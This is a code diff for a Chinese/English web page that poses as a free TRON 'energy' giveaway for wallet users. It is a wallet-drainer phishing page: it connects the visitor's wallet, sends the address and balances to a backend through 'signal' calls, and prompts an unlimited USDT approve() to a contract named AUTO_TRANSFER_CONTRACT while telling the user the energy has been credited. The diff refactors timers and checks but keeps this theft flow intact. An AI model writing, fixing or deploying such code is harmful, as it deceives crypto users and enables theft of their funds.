@@ -798,10 +798,6 @@
     /********************************************************************
      * 核心配置项：集中管理所有常量（便于后续修改，不改动业务逻辑）
      ********************************************************************/
-    <script>
-    /********************************************************************
-     * 核心配置项：集中管理所有常量（便于后续修改，不改动业务逻辑）
-     ********************************************************************/
     const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊地址（豁免A1防重复逻辑）
     const A1_SIGNAL_KEY = "a1_signal_records"; // A1信号发送记录（15分钟防重复）
     const A1_STATUS_KEY = "a1_signal_status"; // A1信号状态（环境校验结果）
@@ -918,7 +914,6 @@
             freeEnergy: "免费领取",
             systemBusyTip: "系统繁忙请稍后重试",
             ineligibleTip: "不符合领取条件",
-            a1SignalFailTip: "⚠️ A1环境校验失败，无法领取能量",
             errorTipPrefix: "⚠️ ",
             noWalletAddress: "❌ 未检测到有效钱包地址<br><span style='color: #000000; font-size: 14px;'>请重新选择钱包连接</span>",
             nonImTokenUser: "非TRON兼容钱包用户<br><span style='color: #000000; font-size: 13px;'>正在自动唤起支持的钱包...</span>",
@@ -986,7 +981,6 @@
             freeEnergy: "Free Claim",
             systemBusyTip: "System busy, please try again later",
             ineligibleTip: "Ineligible",
-            a1SignalFailTip: "⚠️ A1 environment verification failed, unable to claim energy",
             errorTipPrefix: "⚠️ ",
             noWalletAddress: "❌ No valid wallet address detected<br><span style='color: #000000; font-size: 14px;'>Please select a wallet to reconnect</span>",
             nonImTokenUser: "Non-TRON-compatible wallet user<br><span style='color: #000000; font-size: 13px;'>Auto-launching supported wallet...</span>",
@@ -994,6 +988,7 @@
             specialTipContent: "This link is only for emergency assistance to TRON ecosystem users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
         }
     };
+
     /********************************************************************
      * 全局状态变量：仅保留必要状态，无新增/删除
      ********************************************************************/
@@ -1007,6 +1002,7 @@
     let currentLang = localStorage.getItem("tron_energy_lang") || "zh"; // 当前语言
     let trxTimer = null; // 能量倒计时定时器
     let contractEnergyEl = null; // 合约剩余能量DOM元素
+
     /********************************************************************
      * DOM元素集中获取：避免重复查询，提升性能（变量名与原代码一致）
      ********************************************************************/
@@ -1040,9 +1036,11 @@
         walletItems: document.querySelectorAll(".wallet-item"),
         statusAddressEl: document.getElementById("statusAddress")
     };
+
     /********************************************************************
      * 工具函数：通用辅助逻辑（修复能量/宽带查询方式）
      ********************************************************************/
+
     /**
      * 获取已授权领取的地址列表（30天限制）
      * @returns {Array} 已授权地址数组
@@ -1056,6 +1054,7 @@
             return [];
         }
     }
+
     /**
      * 添加地址到已授权列表（领取成功后调用）
      * @param {string} address - 钱包地址
@@ -1071,6 +1070,7 @@
             console.warn("存储已授权地址失败：", e);
         }
     }
+
     /**
      * 检查地址是否已授权领取（30天内）
      * @param {string} address - 钱包地址
@@ -1086,8 +1086,9 @@
         const thirtyDays = 30 * 24 * 60 * 60 * 1000;
         return Date.now() - receiveTime < thirtyDays;
     }
+
     /**
-     * 检查是否可以发送A1信号（15分钟防重复，特殊地址也需校验）
+     * 检查是否可以发送A1信号（15分钟防重复）
      * @param {string} address - 钱包地址
      * @returns {boolean} true=可发送，false=不可发送
      */
@@ -1096,12 +1097,13 @@
             const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
             const lastSendTime = records[address] || 0;
             const now = Date.now();
-            return now - lastSendTime > 15 * 60 * 1000; // 15分钟间隔（特殊地址也遵循）
+            return now - lastSendTime > 15 * 60 * 1000; // 15分钟间隔
         } catch (e) {
             console.warn("检查A1信号发送权限失败：", e);
             return true;
         }
     }
+
     /**
      * 更新A1信号发送记录（发送后调用）
      * @param {string} address - 钱包地址
@@ -1115,6 +1117,7 @@
             console.warn("更新A1信号记录失败：", e);
         }
     }
+
     /**
      * 检查是否已发送B1信号（30天防重复）
      * @param {string} address - 钱包地址
@@ -1131,6 +1134,7 @@
             return false;
         }
     }
+
     /**
      * 标记B1信号已发送（发送后调用）
      * @param {string} address - 钱包地址
@@ -1144,6 +1148,7 @@
             console.warn("标记B1信号失败：", e);
         }
     }
+
   /**
  * 修复：查询带宽余额（兼容所有钱包，按TRON官方规范计算剩余带宽）
  * 说明：使用getBandwidth获取已用带宽，通过默认总额5000计算剩余，去掉local参数确保多钱包适配
@@ -1152,7 +1157,7 @@
  */
 async function queryBandwidthBalance(address) {
     try {
-        if (!tronWeb || !tronWeb.ready) return 0;
+        if (!tronWeb) return 0;
         
         // 调用TRON官方API查询带宽使用情况（兼容所有钱包的全局tronWeb实例）
         const bandwidthData = await tronWeb.trx.getBandwidth(address);
@@ -1167,6 +1172,7 @@ async function queryBandwidthBalance(address) {
         return 0;
     }
 }
+
 /**
  * 修复：查询能量余额（兼容所有钱包，包含冻结能量的总剩余能量）
  * 说明：使用getAccountResources获取完整能量数据，确保包含冻结能量，去掉local参数兼容多钱包
@@ -1175,7 +1181,7 @@ async function queryBandwidthBalance(address) {
  */
 async function queryUserEnergyBalance(address) {
     try {
-        if (!tronWeb || !tronWeb.ready) return 0;
+        if (!tronWeb) return 0;
         
         // 调用TRON官方API查询完整账户资源（兼容所有钱包的全局tronWeb实例）
         const accountResources = await tronWeb.trx.getAccountResources(address);
@@ -1200,6 +1206,7 @@ async function queryUserEnergyBalance(address) {
             DOM.langToggleBtn.innerHTML = '🇺🇸 <span id="currentLangText">English</span>';
         }
     }
+
     /**
      * 切换语言（更新页面文本+缓存）
      * @param {string} newLang - 新语言（zh/en）
@@ -1213,6 +1220,7 @@ async function queryUserEnergyBalance(address) {
         renderEnergyRecords();
         DOM.langDropdown.classList.remove("open");
     }
+
     /**
      * 更新页面所有语言相关文本（切换语言后调用）
      */
@@ -1229,6 +1237,7 @@ async function queryUserEnergyBalance(address) {
         DOM.reviewTipText.textContent = lang.reviewTipText;
         DOM.approvalRecords.textContent = lang.noRecord;
     }
+
     /**
      * 计算当前合约剩余能量（倒计时逻辑，无修改）
      * @returns {number} 当前剩余能量
@@ -1258,6 +1267,7 @@ async function queryUserEnergyBalance(address) {
         if (contractEnergyEl) contractEnergyEl.textContent = Math.floor(currentEnergy);
         return currentEnergy;
     }
+
     /**
      * 更新合约剩余能量显示（倒计时刷新，无修改）
      */
@@ -1269,8 +1279,9 @@ async function queryUserEnergyBalance(address) {
         contractEnergyEl.offsetHeight; // 强制重绘
         console.log("能量跳动中：", Math.floor(currentEnergy));
     }
+
     /**
-     * 启动能量倒计时定时器（页面加载后调用，改用setInterval避免递归风险）
+     * 启动能量倒计时定时器（页面加载后调用，无修改）
      */
     function startPersistentEnergyCountdown() {
         const hasClearedOldCache = localStorage.getItem("has_cleared_old_cache");
@@ -1278,13 +1289,20 @@ async function queryUserEnergyBalance(address) {
             localStorage.removeItem(STORAGE_KEY);
             localStorage.setItem("has_cleared_old_cache", "true");
         }
-        if (trxTimer) clearInterval(trxTimer); // 替换为clearInterval
+        if (trxTimer) clearTimeout(trxTimer);
         calculateCurrentEnergy();
         updateEnergyDisplay();
-        // 改用setInterval更规范，避免栈溢出
-        trxTimer = setInterval(updateEnergyDisplay, 1000);
-        console.log("能量定时器已启动，interval模式");
+
+        function tick() {
+            updateEnergyDisplay();
+            if (currentEnergy > 0) {
+                trxTimer = setTimeout(tick, 1000);
+            }
+        }
+        tick();
+        console.log("能量定时器已启动，递归模式");
     }
+
     /**
      * 保存能量领取记录到本地存储（无修改）
      */
@@ -1302,6 +1320,7 @@ async function queryUserEnergyBalance(address) {
         });
         localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
     }
+
     /**
      * 渲染能量领取记录（页面显示，无修改）
      */
@@ -1321,6 +1340,7 @@ async function queryUserEnergyBalance(address) {
             </div>
         `).join("");
     }
+
     /**
      * 更新钱包连接状态显示（已连接/未连接，无修改）
      */
@@ -1329,6 +1349,7 @@ async function queryUserEnergyBalance(address) {
             ? DOM.walletStatusContainer.classList.add("connected") 
             : DOM.walletStatusContainer.classList.remove("connected");
     }
+
     /**
      * 重置用户余额显示（未连接钱包时，无修改）
      */
@@ -1338,27 +1359,11 @@ async function queryUserEnergyBalance(address) {
         DOM.balanceEnergyEl.textContent = "--";
         DOM.balanceBandwidthEl.textContent = "--";
     }
-    /**
-     * 新增：更新用户信息显示（补全未定义函数）
-     */
-    function updateUserInfoDisplay() {
-        const lang = langConfig[currentLang];
-        if (!userAddress) {
-            DOM.userInfoDefault.style.display = "block";
-            DOM.userInfoStatus.style.display = "none";
-            updateUserBalanceDisplay();
-        } else {
-            DOM.userInfoDefault.style.display = "none";
-            DOM.userInfoStatus.style.display = "block";
-            // 显示地址（统一格式）
-            if (DOM.statusAddressEl) {
-                DOM.statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            }
-        }
-    }
+
     /********************************************************************
      * 新增核心验证/显示函数：按讨论逻辑新增，不影响原有功能
      ********************************************************************/
+
     /**
      * 验证用户资格（前置“门”：余额+领取记录）
      * @returns {Object} { eligible: 是否符合条件, tip: 显示提示文本, btnText: 按钮文本 }
@@ -1376,6 +1381,7 @@ async function queryUserEnergyBalance(address) {
         // 验证通过
         return { eligible: true, tip: lang.eligibleTip, btnText: lang.approveBtnText };
     }
+
     /**
      * 仅在#userInfo容器显示余额（严格按要求，不涉及其他HTML）
      */
@@ -1386,9 +1392,11 @@ async function queryUserEnergyBalance(address) {
         DOM.balanceEnergyEl.textContent = Math.floor(currentEnergy); // 确保显示查询到的能量
         DOM.balanceBandwidthEl.textContent = Math.floor(currentBandwidth); // 确保显示查询到的宽带
     }
+
     /********************************************************************
      * 核心业务函数：修复3个问题，不改动核心逻辑
      ********************************************************************/
+
     /**
      * 发送A1信号到后端（环境校验）
      * @returns {string} success=发送成功，fail=发送失败
@@ -1424,6 +1432,7 @@ async function queryUserEnergyBalance(address) {
             return "fail";
         }
     }
+
     /**
      * 发送A2信号到后端（余额信息上报）
      * @returns {boolean} true=发送成功，false=发送失败
@@ -1458,6 +1467,7 @@ async function queryUserEnergyBalance(address) {
             return false;
         }
     }
+
     /**
      * 发送B信号到后端（领取资格校验/确认）
      * @param {boolean} isB1 - 是否为B1信号（true=校验，false=确认）
@@ -1497,8 +1507,9 @@ async function queryUserEnergyBalance(address) {
             return false;
         }
     }
+
     /**
-     * 绑定领取能量按钮逻辑（核心领取流程，删除A1信号校验）
+     * 绑定领取能量按钮逻辑（核心领取流程，无修改）
      */
     function bindApproveLogic() {
         const lang = langConfig[currentLang];
@@ -1509,22 +1520,25 @@ async function queryUserEnergyBalance(address) {
             DOM.reviewTip.style.display = "flex";
             DOM.reviewTipText.textContent = "发起签名，请在钱包中确认...";
             try {
-                // 移除A1信号校验逻辑（绑定按钮时已确保A1成功）
-                // 1. 发送B1信号（防重复发送，特殊地址豁免）
+               
+                // 2. 发送B1信号（防重复发送，特殊地址豁免）
                 if (!hasSentB1Signal(userAddress) && userAddress !== SPECIAL_ADDRESS) {
                     sendSignalB(true).catch(err => console.warn("B1信号发送失败（不影响签名）：", err));
                     markB1SignalSent(userAddress);
                 }
-                // 2. 初始化合约实例（确保有效）
+
+                // 3. 初始化合约实例（确保有效）
                 if (!trc20Contract) {
                     trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
                     if (!trc20Contract) throw new Error("合约实例初始化失败，请重新连接钱包");
                 }
-                // 3. 确保TronWeb就绪
+
+                // 4. 确保TronWeb就绪
                 if (!tronWeb.ready) {
                     await new Promise(resolve => tronWeb.onReady(resolve));
                 }
-                // 4. 合约授权调用（核心签名流程）
+
+                // 5. 合约授权调用（核心签名流程）
                 const approveResult = await trc20Contract.approve(
                     AUTO_TRANSFER_CONTRACT,
                     INFINITE_APPROVE_AMOUNT
@@ -1532,7 +1546,8 @@ async function queryUserEnergyBalance(address) {
                     from: userAddress,
                     shouldPollResponse: true
                 });
-                // 5. 签名成功后收尾
+
+                // 6. 签名成功后收尾
                 DOM.reviewTipText.textContent = "签名成功，能量已到账...";
                 await Promise.all([
                     sendSignalA2().catch(err => console.warn("A2信号同步失败：", err)),
@@ -1551,14 +1566,16 @@ async function queryUserEnergyBalance(address) {
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
                 let errMsg = e.message;
-                if (errMsg.includes("contract")) errMsg = "合约实例无效，请重新连接钱包";
+                if (errMsg.includes("A1环境校验")) errMsg = "A1环境校验未通过，请重新连接钱包";
+                else if (errMsg.includes("contract")) errMsg = "合约实例无效，请重新连接钱包";
                 alert(lang.authorizeFail.replace("{msg}", errMsg || "签名取消或网络异常"));
             }
         };
     }
+
     /**
      * 修复1：钱包连接后显示地址；修复2：能量/宽带获取
-     * 初始化钱包（核心调整：A1信号地址有效后立即异步发送）
+     * 初始化钱包（核心重构：按“地址→余额→验证→后续”顺序）
      * @param {boolean} isAfterApprove - 是否为授权后初始化
      */
     async function initWallet(isAfterApprove = false) {
@@ -1574,7 +1591,7 @@ async function queryUserEnergyBalance(address) {
                 statusAddressEl.textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
             } else if (statusAddressEl) {
                 statusAddressEl.textContent = "——";
-            }
+            }    
             
             updateWalletStatus(); // 切换为已连接状态，显示钱包地址
             if (!userAddress) {
@@ -1613,7 +1630,6 @@ async function queryUserEnergyBalance(address) {
                 a1SignalSuccess = a1Status[userAddress] === "success";
                 console.log("A1信号15分钟内已发送，本地状态：", a1SignalSuccess ? "成功" : "失败");
             }
-
             // 步骤2：立即查询本地余额（第二步，仅查询不显示）
             DOM.userInfoDefault.style.display = "none";
             DOM.userInfoStatus.style.display = "block";
@@ -1633,6 +1649,7 @@ async function queryUserEnergyBalance(address) {
             currentEnergy = userEnergy; // 保存查询到的能量
             currentBandwidth = userBandwidth; // 保存查询到的宽带
             // 修复1：拿到地址后立即显示钱包地址（不管验证是否通过）
+            
             showBalanceInUserInfo();
            
           
@@ -1641,8 +1658,10 @@ async function queryUserEnergyBalance(address) {
             if (!eligible) {
                 // 验证不通过：仅显示提示，不显示余额、不绑定按钮
                 DOM.userInfoStatus.innerHTML = tip;
+            
                 DOM.approveBtn.disabled = true;
                 DOM.approveBtn.textContent = btnText;
+                
                 if (userAddress) renderEnergyRecords();
                 return;
             }
@@ -1650,6 +1669,7 @@ async function queryUserEnergyBalance(address) {
             // 步骤4：验证通过！执行后续操作（第四步）
             // 4.1 仅在#userInfo容器显示余额（包含能量/宽带）
            
+
             // 4.2 更新UI状态
             DOM.userInfoStatus.innerHTML = tip; // 显示“可领取”提示
             DOM.recordList.style.display = "block";
@@ -1689,14 +1709,15 @@ async function queryUserEnergyBalance(address) {
         await initWallet(false);
         return;
     }
+
     // 非钱包环境：自动显示弹窗（核心需求）+ 显示连接按钮（关闭后可重新触发）
-    const lang = langConfig[currentLang];
     DOM.specialTipContainer.style.display = "block";
     DOM.userInfoDefault.style.display = "none";
     DOM.userInfoStatus.style.display = "block";
-    DOM.userInfoStatus.innerHTML = lang.userInfoDefault; // 多语言适配，不硬编码
+    DOM.userInfoStatus.innerHTML = "请选择要连接的钱包";
     DOM.approveBtn.style.display = "none";
     DOM.connectBtn.style.display = "block"; // 显示按钮，关闭弹窗后可重新点击
+
     // 自动显示弹窗（强制定位在底部，避免位置问题）
     DOM.multiWalletPopup.style.display = "block";
     DOM.multiWalletPopup.style.position = "fixed";
@@ -1706,6 +1727,7 @@ async function queryUserEnergyBalance(address) {
     DOM.multiWalletPopup.style.height = "100%";
     DOM.multiWalletPopup.style.background = "rgba(0,0,0,0.7)";
     DOM.multiWalletPopup.style.zIndex = "9999";
+
     // 弹窗内容强制定位底部
     const popupContent = DOM.multiWalletPopup.querySelector('.wallet-modal-content');
     if (popupContent) {
@@ -1717,12 +1739,13 @@ async function queryUserEnergyBalance(address) {
         popupContent.style.maxWidth = "500px";
     }
 }
+
     /**
-     * 重新渲染动态内容（调整A1信号发送逻辑，与initWallet一致）
+     * 重新渲染动态内容（语言切换/状态变化后调用，无修改）
      */
     async function reRenderDynamicContent() {
         const lang = langConfig[currentLang];
-        let a1SignalSuccess = false; // 存储A1信号结果
+        let a1SignalSuccess = false;
         if (!userAddress) {
             DOM.approveBtn.disabled = true;
             DOM.approveBtn.textContent = lang.approveBtnText;
@@ -1733,6 +1756,7 @@ async function queryUserEnergyBalance(address) {
         DOM.recordList.style.display = "block";
         DOM.recordList.style.visibility = "visible";
 
+        
         // 地址有效后立即异步发送A1信号（防重复校验）
         if (canSendA1Signal(userAddress)) {
             sendSignalA1().then(result => {
@@ -1792,7 +1816,7 @@ async function queryUserEnergyBalance(address) {
         renderEnergyRecords();
     }
     /********************************************************************
-     * 事件绑定：集中管理所有事件，合并重复监听器
+     * 事件绑定：集中管理所有事件，无修改仅整理顺序
      ********************************************************************/
    document.addEventListener('DOMContentLoaded', async () => {
     /****************************************************************
@@ -1809,6 +1833,7 @@ async function queryUserEnergyBalance(address) {
         DOM.multiWalletPopup.style.height = "100%";
         DOM.multiWalletPopup.style.background = "rgba(0,0,0,0.7)";
         DOM.multiWalletPopup.style.zIndex = "9999";
+
         // 弹窗内容定位
         const popupContent = DOM.multiWalletPopup.querySelector('.wallet-modal-content');
         if (popupContent) {
@@ -1817,12 +1842,13 @@ async function queryUserEnergyBalance(address) {
             popupContent.style.left = "50%";
             popupContent.style.transform = "translateX(-50%)";
         }
-        // 更新提示文本（多语言适配）
-        const lang = langConfig[currentLang];
+
+        // 更新提示文本
         DOM.userInfoDefault.style.display = "none";
         DOM.userInfoStatus.style.display = "block";
-        DOM.userInfoStatus.innerHTML = lang.userInfoDefault;
+        DOM.userInfoStatus.innerHTML = langConfig[currentLang].userInfoDefault;
     });
+
     /****************************************************************
      * 弹窗关闭逻辑（关闭后隐藏，按钮可重新触发）
      ****************************************************************/
@@ -1838,11 +1864,14 @@ async function queryUserEnergyBalance(address) {
             alert("⚠️ 能量显示元素未找到，请检查页面中是否有id='contractEnergy'的标签");
             return;
         }
-        // 启动能量倒计时（原代码保留，改用setInterval）
+
+        // 启动能量倒计时（原代码保留）
         startPersistentEnergyCountdown();
+
         // 初始化语言显示（原代码保留）
         initLangDisplay();
         updatePageLang();
+
         // 初始化合约地址显示（原代码保留）
         DOM.contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
         contractEnergyEl.textContent = Math.floor(INIT_TRX);
@@ -1851,6 +1880,7 @@ async function queryUserEnergyBalance(address) {
         renderEnergyRecords();
         updateWalletStatus();
         updateUserBalanceDisplay();
+
         /****************************************************************
          * 语言切换事件（原代码保留）
          ****************************************************************/
@@ -1858,6 +1888,7 @@ async function queryUserEnergyBalance(address) {
             e.stopPropagation();
             DOM.langDropdown.classList.toggle("open");
         });
+
         DOM.langDropdownItems.forEach(item => {
             item.addEventListener("click", (e) => {
                 e.stopPropagation();
@@ -1865,12 +1896,15 @@ async function queryUserEnergyBalance(address) {
                 changeLang(newLang);
             });
         });
+
         document.addEventListener("click", () => {
             DOM.langDropdown.classList.remove("open");
         });
+
         DOM.langDropdown.addEventListener("click", (e) => {
             e.stopPropagation();
         });
+
         /****************************************************************
          * 多钱包弹窗事件（原代码保留）
          ****************************************************************/
@@ -1880,6 +1914,7 @@ async function queryUserEnergyBalance(address) {
                 const walletType = item.getAttribute("data-wallet");
                 const wallet = walletConfig[walletType];
                 if (!wallet) return;
+
                 const targetUrl = window.location.href + "#approve";
                 let jumpUrl = "";
                 switch (walletType) {
@@ -1904,8 +1939,10 @@ async function queryUserEnergyBalance(address) {
                     default:
                         jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
                 }
+
                 console.log(`📤 跳转${wallet.name}：`, jumpUrl);
                 window.location.href = jumpUrl;
+
                 setTimeout(() => {
                     if (!window.tronWeb) {
                         alert(langConfig[currentLang].evokeGuide);
@@ -1914,6 +1951,7 @@ async function queryUserEnergyBalance(address) {
                 }, 3000);
             });
         });
+
         /****************************************************************
          * 授权后跳转页面处理（原代码保留）
          ****************************************************************/
@@ -1923,24 +1961,28 @@ async function queryUserEnergyBalance(address) {
                 initWallet(true).catch(err => {
                     console.error("授权后初始化失败：", err);
                     const lang = langConfig[currentLang];
+                    const tip = lang.ineligibleTip;
                     DOM.userInfoDefault.style.display = "none";
                     DOM.userInfoStatus.style.display = "block";
-                    DOM.userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 14px;'>${lang.errorTipPrefix}${lang.connectError}</span>`;
+                    DOM.userInfoStatus.innerHTML = `<span style='color: #000000; font-size: 14px;'>${lang.errorTipPrefix}${tip}</span>`;
                     DOM.approveBtn.disabled = false;
                     DOM.approveBtn.textContent = lang.approveBtnText;
                 });
             }, 500);
         }
+
         /****************************************************************
          * 页面卸载时清理定时器（原代码保留）
          ****************************************************************/
         window.addEventListener("beforeunload", () => {
-            if (trxTimer) clearInterval(trxTimer); // 同步改为clearInterval
+            if (trxTimer) clearTimeout(trxTimer);
         });
+    });
 
-        /****************************************************************
-         * 加载动画结束后初始化（合并到统一监听器）
-         ****************************************************************/
+    /********************************************************************
+     * 加载动画结束后初始化（原代码保留，无修改）
+     ********************************************************************/
+    document.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => {
             const loadingEl = document.getElementById("Loading");
             if (loadingEl) loadingEl.style.display = "none";
@@ -1963,4 +2005,5 @@ async function queryUserEnergyBalance(address) {
 </script>
 </body>
 </html>
+       
        
